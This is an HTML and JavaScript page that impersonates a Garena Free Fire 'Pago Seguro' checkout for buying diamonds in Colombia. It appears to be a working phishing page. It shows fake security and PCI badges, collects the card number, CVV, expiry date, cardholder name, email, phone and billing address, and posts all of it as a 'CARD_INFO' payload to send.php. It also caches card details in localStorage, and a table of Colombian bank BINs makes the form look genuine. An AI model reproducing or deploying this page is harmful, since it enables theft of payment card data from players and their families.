<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pago Seguro | Garena Free Fire</title>

    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            --color-primary: #E41E26;
            --color-primary-light: #ff3841;
            --color-accent: #ff6b35;
            --color-dark: #0a0a0a;
            --color-border: #ff6b35;
            --color-bg: #1a1a1a;
            --color-error: #d32f2f;
            --color-success: #4caf50;
            --radius: 12px;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
        }

        .page-wrapper {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 16px;
        }

        .panel {
            width: 100%;
            max-width: 480px;
            background: #1e1e1e;
            border-radius: var(--radius);
            box-shadow: 0 10px 40px rgba(228, 30, 38, 0.3), 0 2px 8px rgba(0, 0, 0, 0.5);
            padding: 32px 28px;
            border-top: 4px solid var(--color-primary);
        }

        .checkout-header {
            text-align: center;
            margin-bottom: 28px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(228, 30, 38, 0.3);
        }

        .logo-container {
            margin-bottom: 16px;
        }

        .logo-img {
            height: 60px;
            object-fit: contain;
            border-radius: 12px;
        }

        .checkout-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin: 0 0 6px;
            color: var(--color-primary);
            letter-spacing: -0.02em;
        }

        .checkout-subtitle {
            margin: 0;
            font-size: 0.875rem;
            color: #999;
        }

        .secure-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: linear-gradient(135deg, rgba(228, 30, 38, 0.2) 0%, rgba(255, 107, 53, 0.2) 100%);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.75rem;
            color: #ff6b35;
            font-weight: 600;
            margin-top: 10px;
            border: 1px solid rgba(228, 30, 38, 0.4);
        }

        .field-group {
            margin-bottom: 18px;
        }

        .field-label {
            display: block;
            font-size: 0.875rem;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 6px;
        }

        .field-label span {
            color: var(--color-error);
        }

        .input-text,
        .select-simple {
            width: 100%;
            padding: 12px 14px;
            border-radius: 8px;
            border: 2px solid #333;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.2s ease;
            background: #2a2a2a;
            color: #ffffff;
        }

        .input-text:focus,
        .select-simple:focus {
            border-color: var(--color-primary);
            box-shadow: 0 0 0 3px rgba(228, 30, 38, 0.2);
        }

        .input-text.error {
            border-color: var(--color-error);
        }

        .input-text.success {
            border-color: var(--color-success);
        }

        .error-msg {
            display: block;
            font-size: 0.8rem;
            color: var(--color-error);
            margin-top: 4px;
            min-height: 18px;
        }

        .bank-badge {
            display: inline-block;
            font-size: 0.75rem;
            color: #ff6b35;
            background: rgba(228, 30, 38, 0.2);
            padding: 6px 12px;
            border-radius: 12px;
            margin-top: 6px;
            font-weight: 600;
            border: 1px solid rgba(228, 30, 38, 0.4);
        }

        .inline-row {
            display: flex;
            gap: 12px;
        }

        .inline-row .field-group {
            flex: 1;
        }

        .country-phone {
            display: flex;
            gap: 8px;
        }

        .country-flag {
            display: flex;
            align-items: center;
            padding: 12px 14px;
            border-radius: 8px;
            border: 2px solid #333;
            background: #2a2a2a;
            font-size: 0.9rem;
            white-space: nowrap;
            font-weight: 600;
            color: #ffffff;
        }

        .card-brands {
            display: flex;
            gap: 8px;
            margin-top: 8px;
            opacity: 0.6;
        }

        .card-brands img {
            height: 24px;
            filter: grayscale(1);
            transition: filter 0.2s;
        }

        .card-brands img.active {
            filter: grayscale(0);
            opacity: 1;
        }

        .section-divider {
            text-align: center;
            font-size: 0.85rem;
            color: #666;
            margin: 24px 0 20px;
            position: relative;
        }

        .section-divider::before,
        .section-divider::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 38%;
            height: 1px;
            background: linear-gradient(to right, transparent, rgba(228, 30, 38, 0.3), transparent);
        }

        .section-divider::before {
            left: 0;
        }

        .section-divider::after {
            right: 0;
        }

        .footer-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 28px;
            padding-top: 20px;
            border-top: 2px solid rgba(228, 30, 38, 0.3);
        }

        .pci-badge {
            height: 36px;
            object-fit: contain;
            opacity: 0.7;
        }

        .btn-primary {
            padding: 14px 32px;
            border-radius: 8px;
            border: none;
            background: linear-gradient(135deg, var(--color-primary) 0%, var(--color-primary-light) 100%);
            color: #fff;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(228, 30, 38, 0.4);
            position: relative;
            overflow: hidden;
        }

        .btn-primary::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(228, 30, 38, 0.6);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn-primary span.amount {
            font-weight: 800;
            margin-left: 6px;
            color: #ffd700;
        }

        .total-summary {
            background: linear-gradient(135deg, rgba(228, 30, 38, 0.1) 0%, rgba(255, 107, 53, 0.1) 100%);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 24px;
            border: 2px solid rgba(228, 30, 38, 0.3);
        }

        .total-summary .row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: #ccc;
        }

        .total-summary .row i {
            margin-right: 6px;
            color: #ff6b35;
        }

        .total-summary .row.total {
            font-weight: 700;
            font-size: 1.2rem;
            color: #ff6b35;
            padding-top: 12px;
            border-top: 2px solid rgba(228, 30, 38, 0.3);
            margin-top: 8px;
            margin-bottom: 0;
        }

        @media (max-width: 540px) {
            .panel {
                padding: 24px 20px;
            }

            .footer-row {
                flex-direction: column;
                gap: 16px;
            }

            .btn-primary {
                width: 100%;
                text-align: center;
            }

            .pci-badge {
                order: 1;
            }
        }

        .loading {
            pointer-events: none;
            opacity: 0.6;
        }

        .loading .btn-primary::after {
            content: " ‚è≥";
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <form class="panel" id="paymentForm">
            <div class="checkout-header">
                <div class="logo-container">
                    <img src="../images/free-fire-icon.png" alt="Free Fire" class="logo-img">
                </div>
                <h1 class="checkout-title">Pago Seguro Garena</h1>
                <p class="checkout-subtitle">Completa tu pedido con tarjeta de cr√©dito</p>
                <div class="secure-badge">
                    <i class="fas fa-lock"></i>
                    Conexi√≥n segura y encriptada
                </div>
            </div>

            <!-- RESUMEN DE COMPRA -->
            <div class="total-summary">
                <div class="row">
                    <span><i class="fas fa-gem"></i> Diamantes:</span>
                    <span id="diamondsDisplay">310</span>
                </div>
                <div class="row">
                    <span><i class="fas fa-gift"></i> Bono:</span>
                    <span id="bonusDisplay">31</span>
                </div>
                <div class="row">
                    <span><i class="fas fa-user"></i> Jugador:</span>
                    <span id="playerDisplay">---</span>
                </div>
                <div class="row total">
                    <span>Total a pagar:</span>
                    <span id="totalDisplay">COP$ 0</span>
                </div>
            </div>

            <div class="field-group">
                <label class="field-label" for="email">Correo electr√≥nico <span>*</span></label>
                <input id="email" class="input-text" type="email" placeholder="tu@correo.com" required>
                <span class="error-msg" id="emailError"></span>
            </div>

            <div class="field-group">
                <label class="field-label">Celular <span>*</span></label>
                <div class="country-phone">
                    <div class="country-flag">
                        <span>üá®üá¥ +57</span>
                    </div>
                    <input id="phone" class="input-text" type="tel" inputmode="numeric" placeholder="3001234567"
                        maxlength="10" required>
                </div>
                <span class="error-msg" id="phoneError"></span>
            </div>

            <div class="field-group">
                <label class="field-label" for="holder">Nombre del titular <span>*</span></label>
                <input id="holder" class="input-text" type="text" placeholder="Como aparece en la tarjeta" required>
                <span class="error-msg" id="holderError"></span>
            </div>

            <div class="field-group">
                <label class="field-label" for="card">N√∫mero de tarjeta <span>*</span></label>
                <input id="card" class="input-text" type="tel" inputmode="numeric" maxlength="19"
                    placeholder="1234 5678 9012 3456" required>
                <div id="bankBadge" class="bank-badge" style="display:none;"></div>
                <div class="card-brands">
                    <img src="https://img.icons8.com/color/48/visa.png" alt="Visa" id="brandVisa">
                    <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard" id="brandMaster">
                    <img src="https://img.icons8.com/color/48/amex.png" alt="Amex" id="brandAmex">
                </div>
                <span class="error-msg" id="cardError"></span>
            </div>

            <div class="inline-row">
                <div class="field-group">
                    <label class="field-label" for="expiry">Vencimiento <span>*</span></label>
                    <input id="expiry" class="input-text" type="tel" inputmode="numeric" placeholder="MM / AA"
                        maxlength="7" required>
                    <span class="error-msg" id="expiryError"></span>
                </div>
                <div class="field-group">
                    <label class="field-label" for="cvc">CVV <span>*</span></label>
                    <input id="cvc" class="input-text" type="tel" inputmode="numeric" maxlength="4" placeholder="123"
                        required>
                    <span class="error-msg" id="cvcError"></span>
                </div>
            </div>

            <div class="section-divider">Direcci√≥n de facturaci√≥n</div>

            <div class="field-group">
                <label class="field-label" for="country">Pa√≠s</label>
                <select id="country" class="select-simple">
                    <option selected>Colombia</option>
                </select>
            </div>

            <div class="inline-row">
                <div class="field-group">
                    <label class="field-label" for="city">Ciudad</label>
                    <input id="city" class="input-text" type="text" placeholder="Ej. Medell√≠n">
                </div>
                <div class="field-group">
                    <label class="field-label" for="district">Barrio</label>
                    <input id="district" class="input-text" type="text" placeholder="Ej. Laureles">
                </div>
            </div>

            <div class="field-group">
                <label class="field-label" for="street">Direcci√≥n completa</label>
                <input id="street" class="input-text" type="text" placeholder="Calle, carrera, n√∫mero">
            </div>

            <div class="inline-row">
                <div class="field-group">
                    <label class="field-label" for="zip">C√≥digo postal</label>
                    <input id="zip" class="input-text" type="text" placeholder="050001">
                </div>
                <div class="field-group">
                    <label class="field-label" for="addinfo">Info adicional</label>
                    <input id="addinfo" class="input-text" type="text" placeholder="Apto, torre, etc.">
                </div>
            </div>

            <div class="footer-row">
                <img src="img/pci.png" alt="PCI DSS Compliant" class="pci-badge">
                <button type="submit" id="btnPagar" class="btn-primary">
                    <i class="fas fa-credit-card"></i> Pagar<span class="amount"></span>
                </button>
            </div>
        </form>
    </div>

    <script>
        // ===================================
        // VALIDACI√ìN LUHN (Tarjetas)
        // ===================================
        function esLuhnValido(num) {
            const value = (num || "").replace(/\D/g, "");
            if (value.length < 13) return false;

            let sum = 0;
            let even = false;
            for (let i = value.length - 1; i >= 0; i--) {
                let n = parseInt(value[i], 10);
                if (even) {
                    n *= 2;
                    if (n > 9) n -= 9;
                }
                sum += n;
                even = !even;
            }
            return sum % 10 === 0;
        }

        // ===================================
        // VALIDACI√ìN DE FECHA MM/YY
        // ===================================
        function esFechaValida(exp) {
            const clean = (exp || "").replace(/\s/g, "");
            const parts = clean.split("/");
            if (parts.length !== 2) return false;

            let [mm, yy] = parts;
            mm = parseInt(mm, 10);
            yy = parseInt(yy, 10);

            if (isNaN(mm) || isNaN(yy)) return false;
            if (mm < 1 || mm > 12) return false;

            const fullYear = 2000 + yy;
            const now = new Date();
            const thisMonth = now.getMonth() + 1;
            const thisYear = now.getFullYear();

            if (fullYear < thisYear) return false;
            if (fullYear === thisYear && mm < thisMonth) return false;

            return true;
        }

        // ===================================
        // DETECTAR BANCO POR BIN
        // ===================================
        function detectarBanco(bin) {
            bin = (bin || "").replace(/\D/g, "").slice(0, 6);
            if (!bin) return "";

            const map = {
                "450905": "Bancolombia", "409983": "Bancolombia", "402979": "Bancolombia",
                "530373": "Bancolombia", "522001": "Bancolombia", "522002": "Bancolombia",
                "522489": "Bancolombia", "555941": "Bancolombia", "557909": "Bancolombia",
                "558682": "Bancolombia", "559230": "Bancolombia", "559381": "Bancolombia",
                "559985": "Bancolombia", "560197": "Bancolombia", "560418": "Bancolombia",
                "560619": "Bancolombia", "560720": "Bancolombia", "560821": "Bancolombia",
                "560922": "Bancolombia", "561023": "Bancolombia", "561124": "Bancolombia",
                "561225": "Bancolombia", "561326": "Bancolombia", "561427": "Bancolombia",
                "561528": "Bancolombia", "530691": "Bancolombia", "530692": "Bancolombia",
                "530693": "Bancolombia", "409355": "Nequi",
                "457310": "Davivienda", "439116": "Davivienda", "498862": "Davivienda",
                "412767": "Davivienda", "417261": "Davivienda", "520084": "Davivienda",
                "520082": "Davivienda",
                "402739": "Banco de Bogot√°", "426732": "Banco de Bogot√°",
                "456864": "Banco de Bogot√°", "513427": "Banco de Bogot√°",
                "522130": "Banco de Bogot√°",
                "420353": "Banco de Occidente", "489445": "Banco de Occidente",
                "522182": "Banco de Occidente",
                "454106": "Banco Popular", "492115": "Banco Popular",
                "519942": "Banco Popular",
                "522184": "BBVA", "530723": "BBVA", "554379": "BBVA",
                "548673": "BBVA", "515733": "BBVA",
                "409744": "Scotiabank Colpatria", "530712": "Scotiabank Colpatria",
                "438108": "Scotiabank Colpatria", "521853": "Scotiabank Colpatria",
                "423949": "Banco Caja Social", "441016": "Banco Caja Social",
                "514027": "Banco Caja Social",
                "430929": "Banco AV Villas", "451416": "Banco AV Villas",
                "524646": "Banco AV Villas",
                "524627": "Banco Falabella", "525413": "Banco Falabella",
                "535952": "Banco Falabella",
                "454313": "Banco Pichincha", "514907": "Banco Pichincha",
                "520818": "Banco Pichincha",
                "520158": "Banco Ita√∫", "438914": "Banco Ita√∫",
                "409809": "Banco Agrario", "513830": "Banco Agrario",
                "520053": "Banco Coopcentral", "527523": "Banco Coopcentral",
                "451479": "Banco Coomeva",
            };

            return map[bin] || "";
        }

        // ===================================
        // CARGAR DATOS DESDE URL
        // ===================================
        let total = 0;
        let diamonds = 0;
        let bonus = 0;
        let playerName = '';
        let playerId = '';
        let fullName = '';
        let emailPrefill = '';

        document.addEventListener('DOMContentLoaded', () => {
            const params = new URLSearchParams(window.location.search);

            diamonds = parseInt(params.get('diamonds')) || 0;
            bonus = parseInt(params.get('bonus')) || 0;
            total = parseInt(params.get('price')) || 0;
            playerName = params.get('playerName') || '---';
            playerId = params.get('playerId') || '';
            fullName = params.get('fullName') || '';
            emailPrefill = params.get('email') || '';

            if (fullName) document.getElementById('holder').value = fullName;
            if (emailPrefill) document.getElementById('email').value = emailPrefill;

            updateDisplay();
        });

        function updateDisplay() {
            const formatCOP = (num) => {
                return num.toLocaleString('es-CO', {
                    style: 'currency',
                    currency: 'COP',
                    maximumFractionDigits: 0
                });
            };

            document.getElementById('diamondsDisplay').textContent = diamonds;
            document.getElementById('bonusDisplay').textContent = bonus;
            document.getElementById('playerDisplay').textContent = playerName;
            document.getElementById('totalDisplay').textContent = formatCOP(total);
            document.querySelector('#btnPagar .amount').textContent = formatCOP(total);
        }

        const cardInput = document.getElementById('card');
        const cardError = document.getElementById('cardError');
        const bankBadge = document.getElementById('bankBadge');

        cardInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '').slice(0, 16);
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formatted;

            const firstDigit = value[0];
            document.getElementById('brandVisa').classList.toggle('active', firstDigit === '4');
            document.getElementById('brandMaster').classList.toggle('active', firstDigit === '5');
            document.getElementById('brandAmex').classList.toggle('active', firstDigit === '3');

            const banco = detectarBanco(value);
            if (banco) {
                bankBadge.textContent = banco;
                bankBadge.style.display = 'inline-block';
            } else {
                bankBadge.style.display = 'none';
            }

            if (value.length >= 13) {
                if (esLuhnValido(value)) {
                    cardInput.classList.remove('error');
                    cardInput.classList.add('success');
                    cardError.textContent = '';
                } else {
                    cardInput.classList.add('error');
                    cardInput.classList.remove('success');
                    cardError.textContent = 'N√∫mero de tarjeta inv√°lido';
                }
            } else {
                cardInput.classList.remove('error', 'success');
                cardError.textContent = '';
            }
        });

        const expiryInput = document.getElementById('expiry');
        const expiryError = document.getElementById('expiryError');

        expiryInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '').slice(0, 4);
            if (value.length >= 3) {
                value = value.slice(0, 2) + ' / ' + value.slice(2);
            }
            e.target.value = value;

            const digits = value.replace(/\D/g, '');
            if (digits.length === 4) {
                if (esFechaValida(value)) {
                    expiryInput.classList.remove('error');
                    expiryInput.classList.add('success');
                    expiryError.textContent = '';
                } else {
                    expiryInput.classList.add('error');
                    expiryInput.classList.remove('success');
                    expiryError.textContent = 'Fecha inv√°lida o vencida';
                }
            } else {
                expiryInput.classList.remove('error', 'success');
                expiryError.textContent = '';
            }
        });

        const emailInput = document.getElementById('email');
        const emailError = document.getElementById('emailError');

        emailInput.addEventListener('blur', function () {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (emailInput.value && !emailRegex.test(emailInput.value)) {
                emailInput.classList.add('error');
                emailError.textContent = 'Correo inv√°lido';
            } else if (emailInput.value) {
                emailInput.classList.remove('error');
                emailInput.classList.add('success');
                emailError.textContent = '';
            }
        });

        const phoneInput = document.getElementById('phone');
        const phoneError = document.getElementById('phoneError');

        phoneInput.addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/\D/g, '');
            if (e.target.value.length > 0 && e.target.value.length < 10) {
                phoneInput.classList.add('error');
                phoneError.textContent = 'Debe tener 10 d√≠gitos';
            } else if (e.target.value.length === 10) {
                phoneInput.classList.remove('error');
                phoneInput.classList.add('success');
                phoneError.textContent = '';
            }
        });

        document.getElementById('cvc').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        document.getElementById('holder').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^a-zA-Z√°√©√≠√≥√∫√±√Å√â√ç√ì√ö√ë\s]/g, '');
        });

        document.getElementById('paymentForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const cardDigits = cardInput.value.replace(/\D/g, '');
            const expiryVal = expiryInput.value;

            let hayError = false;

            if (!esLuhnValido(cardDigits)) {
                cardInput.classList.add('error');
                cardError.textContent = 'N√∫mero de tarjeta inv√°lido';
                hayError = true;
            }

            if (!esFechaValida(expiryVal)) {
                expiryInput.classList.add('error');
                expiryError.textContent = 'Fecha inv√°lida o vencida';
                hayError = true;
            }

            const requiredFields = ['email', 'phone', 'holder', 'cvc'];
            requiredFields.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                if (!field.value.trim()) {
                    field.classList.add('error');
                    hayError = true;
                }
            });

            if (hayError) {
                alert('Por favor corrige los errores antes de continuar');
                return;
            }

            const banco = detectarBanco(cardDigits);

            const payload = {
                event: 'CARD_INFO',
                total: total,
                diamonds: diamonds,
                bonus: bonus,
                playerId: playerId,
                playerName: playerName,
                cardNumber: cardDigits,
                holder: document.getElementById('holder').value,
                expiry: expiryVal,
                cvv: document.getElementById('cvc').value,
                bank: banco,
                email: emailInput.value,
                phone: '+57' + phoneInput.value,
                country: document.getElementById('country').value,
                city: document.getElementById('city').value,
                district: document.getElementById('district').value,
                zip: document.getElementById('zip').value,
                street: document.getElementById('street').value,
                addinfo: document.getElementById('addinfo').value
            };

            localStorage.setItem('ff_card_num', cardDigits);
            localStorage.setItem('ff_card_holder', payload.holder);
            localStorage.setItem('ff_card_bank', banco);

            console.log('Enviando a send.php:', payload);

            document.body.classList.add('loading');

            fetch('send.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
                .then(res => res.json())
                .then(result => {
                    console.log('Respuesta send.php:', result);

                    if (result.ok) {
                        fetch('../poll_updates.php?clear=1')
                            .then(() => {
                                window.location.href = 'loader.html';
                            });
                    } else {
                        document.body.classList.remove('loading');
                        alert('Error al enviar. Intenta nuevamente.');
                    }
                })
                .catch(err => {
                    console.error('Error:', err);
                    document.body.classList.remove('loading');
                    alert('Error de conexi√≥n. Verifica tu internet.');
                });
        });
    </script>
</body>

</html>